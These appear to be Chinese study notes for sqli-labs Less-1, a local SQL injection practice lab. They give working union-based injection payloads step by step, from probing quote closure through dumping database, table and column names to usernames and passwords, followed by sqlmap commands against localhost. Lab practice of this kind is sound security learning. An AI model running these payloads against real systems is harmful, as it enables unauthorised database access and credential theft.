## `SQL1`

基础标准的测试流程：

#### **初步判断**

```sql
输入?id=1
(正常显示)
输入?id=1'
(报错，或者是别的什么提示)
输入?id=1' or 1=1 -- +
(不报错则说明是单引号闭合)
```

#### 利用过程

```sql
手工查询有多少列 （order by）
?id=1' order by 1（2、3、4一个个尝试直到报错为止） -- +
显示报错位
?id=-1’ union select 1,2,3 --+
爆破库名
?id=-1' union select 1,database(),3 --+
爆破表名（一次性爆破出所有的表名，当然也可以用limit来慢慢爆）
?id=-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security' --+
第六步：爆破列名（爆破全部列名）
?id=-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_schema='security' and table_name='users' --+
第七步：爆破数据
?id=-1' union select 1,group_concat(username,password),3 from users --+
?id=-1' union select 1,group_concat(username,0x3a,password,0x3C,0x68,0x72,0x2F,0x3E),3 from users
 --+      //让数据美观显示
```

## sqlmap的使用

#### GET:

- 法一：

```sql
python3 sqlmap.py -u "http://localhost/sqli-labs/Less-1/?id=1" --level 3 --risk 2 -- batch
python3 sqlmap.py -u "http://localhost/sqli-labs/Less-1/?id=1" --dbs -- batch
python3 sqlmap.py -u "http://localhost/sqli-labs/Less-1/?id=1" -D 数据库名字 --tables -- batch
python3 sqlmap.py -u "http://localhost/sqli-labs/Less-1/?id=1" -D 数据库名字 -T 表名  
```

```sql
sqlmap -u "http://localhost/sqli-labs/Less-1/?id=1" --level 3 --risk 2 -- batch
```
